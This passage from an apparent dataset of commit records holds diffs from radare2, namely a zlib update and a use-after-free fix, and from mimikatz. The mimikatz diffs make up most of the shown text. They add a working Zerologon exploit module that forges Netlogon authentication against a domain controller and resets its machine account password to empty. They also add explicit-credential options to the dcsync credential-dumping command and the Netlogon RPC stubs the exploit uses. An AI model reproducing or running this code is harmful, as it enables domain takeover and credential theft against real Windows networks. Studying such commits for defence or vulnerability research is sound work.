    \ {LF}, 13 {CR}, 32..255).\n  * - BINARY otherwise.\n  * - The following partially-portable\
    \ control characters form a\n  *   \"gray list\" that is ignored in this detection\
    \ algorithm:\n@@ -1124,27 +1103,27 @@ local void compress_block(s, ltree, dtree)\n\
    \ local int detect_data_type(s)\n     deflate_state *s;\n {\n-    /* black_mask\
    \ is the bit mask of black-listed bytes\n+    /* block_mask is the bit mask of\
    \ block-listed bytes\n      * set bits 0..6, 14..25, and 28..31\n      * 0xf3ffc07f\
    \ = binary 11110011111111111100000001111111\n      */\n-    unsigned long black_mask\
    \ = 0xf3ffc07fUL;\n+    unsigned long block_mask = 0xf3ffc07fUL;\n     int n;\n\
    \ \n-    /* Check for non-textual (\"black-listed\") bytes. */\n-    for (n =\
    \ 0; n <= 31; n++, black_mask >>= 1)\n-        if ((black_mask & 1) && (s->dyn_ltree[n].Freq\
    \ != 0))\n+    /* Check for non-textual (\"block-listed\") bytes. */\n+    for\
    \ (n = 0; n <= 31; n++, block_mask >>= 1)\n+        if ((block_mask & 1) && (s->dyn_ltree[n].Freq\
    \ != 0))\n             return Z_BINARY;\n \n-    /* Check for textual (\"white-listed\"\
    ) bytes. */\n+    /* Check for textual (\"allow-listed\") bytes. */\n     if (s->dyn_ltree[9].Freq\
    \ != 0 || s->dyn_ltree[10].Freq != 0\n             || s->dyn_ltree[13].Freq !=\
    \ 0)\n         return Z_TEXT;\n     for (n = 32; n < LITERALS; n++)\n        \
    \ if (s->dyn_ltree[n].Freq != 0)\n             return Z_TEXT;\n \n-    /* There\
    \ are no \"black-listed\" or \"white-listed\" bytes:\n+    /* There are no \"\
    block-listed\" or \"allow-listed\" bytes:\n      * this stream either is empty\
    \ or has tolerated (\"gray-listed\") bytes only.\n      */\n     return Z_BINARY;"
  - "--- a/shlr/zip/zlib/uncompr.c\n+++ b/shlr/zip/zlib/uncompr.c\n@@ -30,7 +30,7\
    \ @@ int ZEXPORT uncompress2 (dest, destLen, source, sourceLen)\n     const Bytef\
    \ *source;\n     uLong *sourceLen;\n {\n-    z_stream stream = {0};\n+    z_stream\
    \ stream;\n     int err;\n     const uInt max = (uInt)-1;\n     uLong len, left;\n\
    @@ -48,7 +48,6 @@ int ZEXPORT uncompress2 (dest, destLen, source, sourceLen)\n\
    \ \n     stream.next_in = (z_const Bytef *)source;\n     stream.avail_in = 0;\n\
    -    stream.total_out = 0;\n     stream.zalloc = (alloc_func)0;\n     stream.zfree\
    \ = (free_func)0;\n     stream.opaque = (voidpf)0;"
  - "--- a/shlr/zip/zlib/zutil.c\n+++ b/shlr/zip/zlib/zutil.c\n@@ -136,8 +136,8 @@\
    \ const char * ZEXPORT zError(err)\n     return ERR_MSG(err);\n }\n \n-#if defined(_WIN32_WCE)\n\
    -    /* The Microsoft C Run-Time Library for Windows CE doesn't have\n+#if defined(_WIN32_WCE)\
    \ && _WIN32_WCE < 0x800\n+    /* The older Microsoft C Run-Time Library for Windows\
    \ CE doesn't have\n      * errno.  We define it as a global variable to simplify\
    \ porting.\n      * Its value is always 0 and should not be used.\n      */"
  commit_message: 'Update zlib from 1.2.9 to 1.2.12


    * Fixes a bunch of bugs spotted by coverity as well as other CVEs reported in
    the last update'
  commit_sha: d6e42b8728e2a514e2c68d7b73bb9a621edb2fa5
  repo_name: radareorg/radare2
- commit_diff:
  - "--- a/libr/io/io_bank.c\n+++ b/libr/io/io_bank.c\n@@ -227,20 +227,20 @@ R_API\
    \ bool r_io_bank_map_add_top(RIO *io, const ut32 bankid, const ut32 mapid) {\n\
    \ \t\tentry = r_rbnode_next (entry);\n \t}\n \tut64 smto = r_io_submap_to (sm);\n\
    -\twhile (entry && r_io_submap_to (((RIOSubMap *)entry->data)) <= smto) {\n-\t\
    \t//delete all submaps that are completly included in sm\n-\t\tRRBNode *next =\
    \ r_rbnode_next (entry);\n-\t\t// this can be optimized, there is no need to do\
    \ search here\n-\t\t// XXX this is a workaround to avoid an UAF in Reproducer:\
    \ iobank-crash\n-\t\tvoid *smfree = bank->submaps->free;\n-\t\tbank->submaps->free\
    \ = NULL;\n-\t\tbool a = r_crbtree_delete (bank->submaps, entry->data, _find_sm_by_from_vaddr_cb,\
    \ NULL);\n-\t\tbank->submaps->free = smfree;\n-\t\tif (!a) {\n-\t\t\tentry = NULL;\n\
    -\t\t\tbreak;\n+\tif (entry) {\n+\t\tut64 ento = r_io_submap_to (((RIOSubMap*)entry->data));\n\
    +\t\twhile (entry && ento <= smto) {\n+\t\t\t//delete all submaps that are completly\
    \ included in sm\n+\t\t\tRRBNode *next = r_rbnode_next (entry);\n+\t\t\t// this\
    \ can be optimized, there is no need to do search here\n+\t\t\t// XXX this is\
    \ a workaround to avoid an UAF in Reproducer: iobank-crash\n+\t\t\tento = r_io_submap_to\
    \ (((RIOSubMap*)entry->data));\n+\t\t\tbool a = r_crbtree_delete (bank->submaps,\
    \ entry->data, _find_sm_by_from_vaddr_cb, NULL);\n+\t\t\tif (!a) {\n+\t\t\t\t\
    next = NULL;\n+\t\t\t}\n+\t\t\tentry = next;\n \t\t}\n-\t\tentry = next;\n \t\
    }\n \tif (entry && r_io_submap_from (((RIOSubMap *)entry->data)) <= r_io_submap_to\
    \ (sm)) {\n \t\tbd = (RIOSubMap *)entry->data;"
  commit_message: "Properly fix the UAF in r_io_bank_map_add_top ##crash\n\n* Associated\
    \ with the CVE-2022-0559\r\n* Reported by alkyne Choi via huntr.dev"
  commit_sha: 3345147916b9bb3da225248d571cdbac690c0c4d
  repo_name: radareorg/radare2
- commit_diff:
  - "--- a/mimikatz/modules/kuhl_m_lsadump.c\n+++ b/mimikatz/modules/kuhl_m_lsadump.c\n\
    @@ -20,6 +20,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {\n \t{kuhl_m_lsadump_netsync,\t\
    L\"netsync\",\t\tL\"Ask a DC to send current and previous NTLM hash of DC/SRV/WKS\"\
    },\r\n \t{kuhl_m_lsadump_packages,\tL\"packages\",\tNULL},\r\n \t{kuhl_m_lsadump_mbc,\t\
    \tL\"mbc\",\t\t\tNULL},\r\n+\t{kuhl_m_lsadump_zerologon,\tL\"zerologon\",\tNULL},\r\
    \n };\r\n \r\n const KUHL_M kuhl_m_lsadump = {\r\n@@ -2436,3 +2437,125 @@ NTSTATUS\
    \ kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])\n \t}\r\n \treturn STATUS_SUCCESS;\r\
    \n }\r\n+\r\n+// Just to let you know about the little hack to make NETAPI32 to\
    \ use ncacn_ip_tcp instead of ncacn_np\r\n+//\r\n+//NTSTATUS kuhl_m_lsadump_zerologon(int\
    \ argc, wchar_t * argv[])\r\n+//{\r\n+//\tDWORD i;\r\n+//\tNETLOGON_CREDENTIAL\
    \ Input = {0}, LazyOutput;\r\n+//\tULONG NegotiateFlags = 0x212fffff;\r\n+//\t\
    \r\n+//\tPBYTE z = (PBYTE) GetModuleHandle(L\"logoncli.dll\");\r\n+//\r\n+//\t\
    VirtualProtect(z + 0x19031, 1, PAGE_EXECUTE_READWRITE, &i);\r\n+//\tz[0x19031]\
    \ = 2;\r\n+//\tVirtualProtect(z + 0x19031, 1, i, &i);\r\n+//\r\n+//\tfor(i = 0;\
    \ i < 2000; i++)\r\n+//\t{\r\n+//\t\tI_NetServerReqChallenge(L\"dc.lab.local\"\
    , MIMIKATZ, &Input, &LazyOutput);\r\n+//\t\tif((I_NetServerAuthenticate2(L\"dc.lab.local\"\
    , L\"dc$\", ServerSecureChannel, MIMIKATZ, &Input, &LazyOutput, &NegotiateFlags)\
    \ == STATUS_SUCCESS))\r\n+//\t\t{\r\n+//\t\t\tkprintf(L\"\\nAuth :)\\n\");\r\n\
    +//\t\t\tbreak;\r\n+//\t\t}\r\n+//\t\telse kprintf(L\"=\");\r\n+//\t}\r\n+//\t\
    return STATUS_SUCCESS;\r\n+//}\r\n+\r\n+// All of that is not very thread safe\r\
    \n+handle_t hLogonNetLogon = NULL;\r\n+handle_t __RPC_USER LOGONSRV_HANDLE_bind(IN\
    \ LOGONSRV_HANDLE Name) {return hLogonNetLogon;}\r\n+void __RPC_USER LOGONSRV_HANDLE_unbind(IN\
    \ LOGONSRV_HANDLE Name, handle_t hLogon) {}\r\n+\r\n+const wchar_t * SecureChannelTypes[]\
    \ = {L\"Null\", L\"MsvAp\", L\"Workstation\", L\"TrustedDnsDomain\", L\"TrustedDomain\"\
    , L\"UasServer\", L\"Server\", L\"CdcServer\"};\r\n+NTSTATUS kuhl_m_lsadump_zerologon(int\
    \ argc, wchar_t * argv[])\r\n+{\r\n+\tNTSTATUS status;\r\n+\tNETLOGON_AUTHENTICATOR\
    \ Authenticator = {{0}, 0}, ReturnAuthenticator;\r\n+\tULONG i, NegotiateFlags\
    \ = 0x212fffff;\r\n+\tNL_TRUST_PASSWORD ClearNewPassword = {{0}, 0};\r\n+\tLPCWSTR\
    \ szTarget, szAccount, szType;\r\n+\tNETLOGON_SECURE_CHANNEL_TYPE type = ServerSecureChannel;\r\
    \n+\tBOOL bExploit, bIsAuth = FALSE, bIsChanged = FALSE;\r\n+\r\n+\tif(kull_m_string_args_byName(argc,\
    \ argv, L\"target\", &szTarget, NULL))\r\n+\t{\r\n+\t\tif(kull_m_string_args_byName(argc,\
    \ argv, L\"account\", &szAccount, NULL))\r\n+\t\t{\r\n+\t\t\tif(kull_m_string_args_byName(argc,\
    \ argv, L\"type\", &szType, NULL))\r\n+\t\t\t\ttype = (NETLOGON_SECURE_CHANNEL_TYPE)\
    \ wcstoul(szType, NULL, 0);\r\n+\t\t\tbExploit = kull_m_string_args_byName(argc,\
    \ argv, L\"exploit\", NULL, NULL);\r\n+\r\n+\t\t\tkprintf(L\"Target : %s\\nAccount:\
    \ %s\\nType   : %u (%s)\\nMode   : %s\\n\\n\", szTarget, szAccount, type, (type\
    \ < ARRAYSIZE(SecureChannelTypes)) ? SecureChannelTypes[type] : L\"?\", bExploit\
    \ ? L\"exploit\" : L\"detect\");\r\n+\t\t\tif(kull_m_rpc_createBinding(NULL, L\"\
    ncacn_ip_tcp\", szTarget, NULL, NULL, FALSE, RPC_C_AUTHN_NONE, NULL, RPC_C_IMP_LEVEL_DEFAULT,\
    \ &hLogonNetLogon, NULL))\r\n+\t\t\t{\r\n+\t\t\t\tstatus = RpcEpResolveBinding(hLogonNetLogon,\
    \ logon_v1_0_c_ifspec);\r\n+\t\t\t\tif(status == RPC_S_OK)\r\n+\t\t\t\t{\r\n+\t\
    \t\t\t\tkprintf(L\"Trying to \\'authenticate\\'...\\n\");\r\n+\t\t\t\t\tRpcTryExcept\r\
    \n+\t\t\t\t\t{\r\n+\t\t\t\t\t\tfor(i = 0; i < 2000; i++)\r\n+\t\t\t\t\t\t{\r\n\
    +\t\t\t\t\t\t\tstatus = NetrServerReqChallenge(NULL, MIMIKATZ, &Authenticator.Credential,\
    \ &ReturnAuthenticator.Credential);\r\n+\t\t\t\t\t\t\tif(status == STATUS_SUCCESS)\r\
    \n+\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\tstatus = NetrServerAuthenticate2(NULL,\
    \ (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential,\
    \ &NegotiateFlags);\r\n+\t\t\t\t\t\t\t\tif(status == STATUS_SUCCESS)\r\n+\t\t\t\
    \t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tbIsAuth = TRUE;\r\n+\t\t\t\t\t\t\t\t\tkprintf(L\"\
    \\n\\n  NetrServerAuthenticate2: 0x%08x\", status);\r\n+\t\t\t\t\t\t\t\t\tif(bExploit)\r\
    \n+\t\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\t\tkprintf(L\"\\n\");\r\n+\t\t\t\t\
    \t\t\t\t\t\tstatus = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type,\
    \ MIMIKATZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword);\r\n+\t\t\
    \t\t\t\t\t\t\t\tif(status == STATUS_SUCCESS)\r\n+\t\t\t\t\t\t\t\t\t\t{\r\n+\t\t\
    \t\t\t\t\t\t\t\t\tbIsChanged = TRUE;\r\n+\t\t\t\t\t\t\t\t\t\t\tkprintf(L\"  NetrServerPasswordSet2\
    \ : 0x%08x\", status);\r\n+\t\t\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\t\telse\
    \ PRINT_ERROR(L\"NetrServerPasswordSet2: 0x%08x\", status);\r\n+\t\t\t\t\t\t\t\
    \t\t}\r\n+\t\t\t\t\t\t\t\t\tbreak;\r\n+\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\t\
    else if(status == STATUS_NO_TRUST_SAM_ACCOUNT)\r\n+\t\t\t\t\t\t\t\t{\r\n+\t\t\t\
    \t\t\t\t\t\tPRINT_ERROR(L\"NetrServerAuthenticate2: STATUS_NO_TRUST_SAM_ACCOUNT\
    \ (cannot find the account or bad type)\", status);\r\n+\t\t\t\t\t\t\t\t\tbreak;\r\
    \n+\t\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\t\telse if(status != STATUS_ACCESS_DENIED)\r\
    \n+\t\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\t\tPRINT_ERROR(L\"NetrServerAuthenticate2:\
    \ 0x%08x\", status);\r\n+\t\t\t\t\t\t\t\t\tbreak;\r\n+\t\t\t\t\t\t\t\t}\r\n+\t\
    \t\t\t\t\t\t\telse kprintf(L\"=\");\r\n+\t\t\t\t\t\t\t}\r\n+\t\t\t\t\t\t\telse\r\
    \n+\t\t\t\t\t\t\t{\r\n+\t\t\t\t\t\t\t\tPRINT_ERROR(L\"NetrServerReqChallenge:\
    \ 0x%08x\", status);\r\n+\t\t\t\t\t\t\t\tbreak;\r\n+\t\t\t\t\t\t\t}\r\n+\t\t\t\
    \t\t\t}\r\n+\t\t\t\t\t}\r\n+\t\t\t\t\tRpcExcept(RPC_EXCEPTION)\r\n+\t\t\t\t\t\t\
    PRINT_ERROR(L\"RPC Exception: 0x%08x (%u)\\n\", RpcExceptionCode(), RpcExceptionCode());\r\
    \n+\t\t\t\t\tRpcEndExcept\r\n+\t\t\t\t\t\tkprintf(L\"\\n\\n* Authentication: %s\\\
    n\", bIsAuth ? L\"OK -- vulnerable\" : L\"KO -- maybe not vulnerable\");\r\n+\t\
    \t\t\t\tif(bExploit)\r\n+\t\t\t\t\t{\r\n+\t\t\t\t\t\tkprintf(L\"* Set password\
    \  : %s\\n\", bIsChanged ? L\"OK -- may be unstable\" : L\"KO\");\r\n+\t\t\t\t\
    \t}\r\n+\t\t\t\t}\r\n+\t\t\t\telse PRINT_ERROR(L\"RpcEpResolveBinding: 0x%08x\\\
    n\", status);\r\n+\t\t\t\tkull_m_rpc_deleteBinding(&hLogonNetLogon);\r\n+\t\t\t\
    }\r\n+\t\t}\r\n+\t\telse PRINT_ERROR(L\"Missing /account argument, usually a DC$\
    \ account\\n\");\r\n+\t}\r\n+\telse PRINT_ERROR(L\"Missing /target argument, can\
    \ be IP or FQDN of a domain controller\\n\");\r\n+\r\n+\treturn STATUS_SUCCESS;\r\
    \n+}\n\\ No newline at end of file"
  - "--- a/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c\n+++ b/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c\n\
    @@ -41,8 +41,9 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])\n\
    \ \tLPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL, szService;\r\
    \n \tLPWSTR szTmpDc = NULL;\r\n \tDRS_EXTENSIONS_INT DrsExtensionsInt;\r\n-\t\
    BOOL someExport = kull_m_string_args_byName(argc, argv, L\"export\", NULL, NULL),\
    \ allData = kull_m_string_args_byName(argc, argv, L\"all\", NULL, NULL), csvOutput\
    \ = kull_m_string_args_byName(argc, argv, L\"csv\", NULL, NULL), withDeleted =\
    \ kull_m_string_args_byName(argc, argv, L\"deleted\", NULL, NULL), decodeUAC =\
    \ kull_m_string_args_byName(argc, argv, L\"uac\", NULL, NULL);\r\n-\t\r\n+\tBOOL\
    \ someExport = kull_m_string_args_byName(argc, argv, L\"export\", NULL, NULL),\
    \ allData = kull_m_string_args_byName(argc, argv, L\"all\", NULL, NULL), csvOutput\
    \ = kull_m_string_args_byName(argc, argv, L\"csv\", NULL, NULL), withDeleted =\
    \ kull_m_string_args_byName(argc, argv, L\"deleted\", NULL, NULL), decodeUAC =\
    \ kull_m_string_args_byName(argc, argv, L\"uac\", NULL, NULL), bAuthNtlm = kull_m_string_args_byName(argc,\
    \ argv, L\"authntlm\", NULL, NULL);\r\n+\tSEC_WINNT_AUTH_IDENTITY secIdentity\
    \ = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};\r\n+\r\n \t\
    if(!kull_m_string_args_byName(argc, argv, L\"domain\", &szDomain, NULL))\r\n \t\
    \tif(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))\r\n \t\t\tszDomain\
    \ = pPolicyDnsDomainInfo->DnsDomainName.Buffer;\r\n@@ -66,8 +67,31 @@ NTSTATUS\
    \ kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])\n \t\t\t\telse\r\n \t\t\t\t\
    \tkprintf(L\"[DC] \\'%s\\' will be the user account\\n\", szUser);\r\n \r\n+\t\
    \t\t\tif(kull_m_string_args_byName(argc, argv, L\"authuser\", (const wchar_t **)\
    \ &secIdentity.User, NULL))\r\n+\t\t\t\t{\r\n+\t\t\t\t\tsecIdentity.UserLength\
    \ = lstrlen((LPCWSTR) secIdentity.User);\r\n+\t\t\t\t\tif(kull_m_string_args_byName(argc,\
    \ argv, L\"authdomain\", (const wchar_t **) &secIdentity.Domain, L\"\"))\r\n+\t\
    \t\t\t\t{\r\n+\t\t\t\t\t\tsecIdentity.DomainLength = lstrlen((LPCWSTR) secIdentity.Domain);\r\
    \n+\t\t\t\t\t}\r\n+\t\t\t\t\tsecIdentity.UserLength = lstrlen((LPCWSTR) secIdentity.User);\r\
    \n+\t\t\t\t\tif(kull_m_string_args_byName(argc, argv, L\"authpassword\", (const\
    \ wchar_t **) &secIdentity.Password, L\"\"))\r\n+\t\t\t\t\t{\r\n+\t\t\t\t\t\t\
    secIdentity.PasswordLength = lstrlen((LPCWSTR) secIdentity.Password);\r\n+\t\t\
    \t\t\t}\r\n+\t\t\t\t}\r\n+\r\n+\t\t\t\tif(secIdentity.UserLength)\r\n+\t\t\t\t\
    {\r\n+\t\t\t\t\tkprintf(L\"[AUTH] Username: %s\\n[AUTH] Domain  : %s\\n[AUTH]\
    \ Password: %s\\n\", secIdentity.User, secIdentity.Domain, secIdentity.Password);\r\
    \n+\t\t\t\t}\r\n+\t\t\t\tif(bAuthNtlm)\r\n+\t\t\t\t{\r\n+\t\t\t\t\tkprintf(L\"\
    [AUTH] Explicit NTLM Mode\\n\");\r\n+\t\t\t\t}\r\n+\r\n \t\t\t\tkull_m_string_args_byName(argc,\
    \ argv, L\"altservice\", &szService, L\"ldap\");\r\n-\t\t\t\tif(kull_m_rpc_createBinding(NULL,\
    \ L\"ncacn_ip_tcp\", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION <\
    \ 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT,\
    \ &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))\r\n+\t\t\t\tif(kull_m_rpc_createBinding(NULL,\
    \ L\"ncacn_ip_tcp\", szDc, NULL, szService, TRUE, bAuthNtlm ? RPC_C_AUTHN_WINNT\
    \ : ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE),\
    \ secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding,\
    \ kull_m_rpc_drsr_RpcSecurityCallback))\r\n \t\t\t\t{\r\n \t\t\t\t\tif(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding,\
    \ szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))\r\
    \n \t\t\t\t\t{\r"
  - "--- a/modules/rpc/kull_m_rpc_ms-nrpc_c.c\n+++ b/modules/rpc/kull_m_rpc_ms-nrpc_c.c\n\
    @@ -0,0 +1,93 @@\n+#include \"kull_m_rpc_ms-nrpc.h\"\r\n+\r\n+typedef struct _netlogon_MIDL_TYPE_FORMAT_STRING\
    \ {\r\n+\tSHORT Pad;\r\n+\tUCHAR Format[101];\r\n+} netlogon_MIDL_TYPE_FORMAT_STRING;\r\
    \n+\r\n+typedef struct _netlogon_MIDL_PROC_FORMAT_STRING {\r\n+\tSHORT Pad;\r\n\
    +#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64\r\n+\tCHAR Format[309];\r\
    \n+#elif defined(_M_IX86)\r\n+\tCHAR Format[301];\r\n+#endif\r\n+} netlogon_MIDL_PROC_FORMAT_STRING;\r\
    \n+\r\n+extern const netlogon_MIDL_TYPE_FORMAT_STRING netlogon__MIDL_TypeFormatString;\r\
    \n+extern const netlogon_MIDL_PROC_FORMAT_STRING netlogon__MIDL_ProcFormatString;\r\
    \n+static const RPC_CLIENT_INTERFACE logon___RpcClientInterface = {sizeof(RPC_CLIENT_INTERFACE),\
    \ {{0x12345678, 0x1234, 0xabcd, {0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb}},\
    \ {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10,\
    \ 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000};\r\n+RPC_IF_HANDLE logon_v1_0_c_ifspec\
    \ = (RPC_IF_HANDLE) &logon___RpcClientInterface;\r\n+handle_t hLogon;\r\n+static\
    \ const GENERIC_BINDING_ROUTINE_PAIR BindingRoutines[] = {{(GENERIC_BINDING_ROUTINE)\
    \ LOGONSRV_HANDLE_bind, (GENERIC_UNBIND_ROUTINE) LOGONSRV_HANDLE_unbind}};\r\n\
    +static const MIDL_STUB_DESC logon_StubDesc = {(void *) & logon___RpcClientInterface,\
    \ MIDL_user_allocate, MIDL_user_free, &hLogon, 0, BindingRoutines, 0, 0, netlogon__MIDL_TypeFormatString.Format,\
    \ 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0};\r\n+\r\n+#if defined(_M_X64)\
    \ || defined(_M_ARM64) // TODO:ARM64\r\n+NTSTATUS NetrServerReqChallenge(IN LOGONSRV_HANDLE\
    \ PrimaryName, IN wchar_t *ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge,\
    \ OUT PNETLOGON_CREDENTIAL ServerChallenge)\r\n+{\r\n+\treturn (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC)\
    \ &logon_StubDesc, (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[0],\
    \ PrimaryName, ComputerName, ClientChallenge, ServerChallenge).Simple;\r\n+}\r\
    \n+NTSTATUS NetrServerAuthenticate2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t\
    \ *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t\
    \ *ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential, OUT PNETLOGON_CREDENTIAL\
    \ ServerCredential, IN OUT ULONG *NegotiateFlags)\r\n+{\r\n+\treturn (NTSTATUS)\
    \ NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc, (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[62],\
    \ PrimaryName, AccountName, SecureChannelType, ComputerName, ClientCredential,\
    \ ServerCredential, NegotiateFlags).Simple;\r\n+}\r\n+NTSTATUS NetrServerPasswordSet2(IN\
    \ LOGONSRV_HANDLE PrimaryName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE\
    \ SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator,\
    \ OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, IN PNL_TRUST_PASSWORD ClearNewPassword)\r\
    \n+{\r\n+\treturn (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc,\
    \ (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[142], PrimaryName,\
    \ AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator,\
    \ ClearNewPassword).Simple;\r\n+}\r\n+NTSTATUS NetrServerTrustPasswordsGet(IN\
    \ LOGONSRV_HANDLE TrustedDcName, IN wchar_t *AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE\
    \ SecureChannelType, IN wchar_t *ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator,\
    \ OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD\
    \ EncryptedNewOwfPassword, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword)\r\
    \n+{\r\n+\treturn (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC) &logon_StubDesc,\
    \ (PFORMAT_STRING) &netlogon__MIDL_ProcFormatString.Format[222], TrustedDcName,\
    \ AccountName, SecureChannelType, ComputerName, Authenticator, ReturnAuthenticator,\
    \ EncryptedNewOwfPassword, EncryptedOldOwfPassword).Simple;\r\n+}\r\n+\r\n+static\
    \ const netlogon_MIDL_PROC_FORMAT_STRING netlogon__MIDL_ProcFormatString = {0,\
    \ {\r\n+\t0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x28, 0x00, 0x31, 0x08,\
    \ 0x00, 0x00, 0x00, 0x5c, 0x3c, 0x00, 0x44, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n+\t0x0b, 0x00, 0x00, 0x00, 0x02,\
    \ 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x10, 0x00, 0x14, 0x00,\
    \ 0x12, 0x21, 0x18, 0x00, 0x14, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00,\
    \ 0x48,\r\n+\t0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x40, 0x00, 0x31, 0x08, 0x00,\
    \ 0x00, 0x00, 0x5c, 0x5e, 0x00, 0x60, 0x00, 0x46, 0x08, 0x0a, 0x01, 0x00, 0x00,\
    \ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,\r\n+\t0x00, 0x00, 0x02, 0x00,\
    \ 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b,\
    \ 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20, 0x00, 0x14, 0x00, 0x12, 0x21,\
    \ 0x28, 0x00,\r\n+\t0x14, 0x00, 0x58, 0x01, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00,\
    \ 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x40,\
    \ 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x8e, 0x02,\r\n+\t0x58, 0x00, 0x46,\
    \ 0x08, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00,\
    \ 0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10,\
    \ 0x00, 0x0d, 0x00,\r\n+\t0x0b, 0x01, 0x18, 0x00, 0x08, 0x00, 0x0a, 0x01, 0x20,\
    \ 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00, 0x2a, 0x00, 0x0a, 0x01, 0x30, 0x00,\
    \ 0x42, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48,\r\n+\t0x00, 0x00,\
    \ 0x00, 0x00, 0x2a, 0x00, 0x48, 0x00, 0x31, 0x08, 0x00, 0x00, 0x00, 0x5c, 0x56,\
    \ 0x00, 0x40, 0x01, 0x46, 0x09, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\
    \ 0x00, 0x00, 0x0b, 0x00,\r\n+\t0x00, 0x00, 0x02, 0x00, 0x0b, 0x01, 0x08, 0x00,\
    \ 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x0d, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x08,\
    \ 0x00, 0x0a, 0x01, 0x20, 0x00, 0x2a, 0x00, 0x12, 0x41, 0x28, 0x00,\r\n+\t0x2a,\
    \ 0x00, 0x12, 0x41, 0x30, 0x00, 0x5a, 0x00, 0x12, 0x41, 0x38, 0x00, 0x5a, 0x00,\
    \ 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00,\r\n+}};\r\n+#elif defined(_M_IX86)\r\
    \n+#pragma optimize(\"\", off) \r\n+NTSTATUS NetrServerReqChallenge(IN LOGONSRV_HANDLE\
    \ PrimaryName, IN wchar_t *ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge,\
    \ OUT PNETLOGON_CREDENTIAL ServerChallenge)\r\n+{\r\n+\treturn (NTSTATUS) NdrClientCall2((PMIDL_STUB_DESC)\
